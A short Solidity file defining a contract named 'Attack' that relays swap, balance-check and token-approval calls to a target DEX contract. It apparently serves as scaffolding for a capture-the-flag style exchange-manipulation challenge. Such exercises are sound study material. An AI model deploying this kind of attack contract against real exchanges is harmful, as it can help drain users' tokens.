pragma solidity ^0.6.0;

interface IDex {
    function swap(
        address,
        address,
        uint256
    ) external;

    function balanceOf(address, address) external view returns (uint256);

    function approve(address spender, uint256 amount) external;
}

contract Attack {
    address contractAddress;

    constructor(address _contractAddress) public {
        contractAddress = _contractAddress;
    }

    function swap(
        address from,
        address to,
        uint256 amount
    ) public {
        IDex(contractAddress).swap(from, to, amount);
    }

    function checkBalance(address token, address account)
        public
        view
        returns (uint256)
    {
        return IDex(contractAddress).balanceOf(token, account);
    }

    function approveTokens(address spender, uint256 amount) public {
        IDex(contractAddress).approve(spender, amount);
    }
}
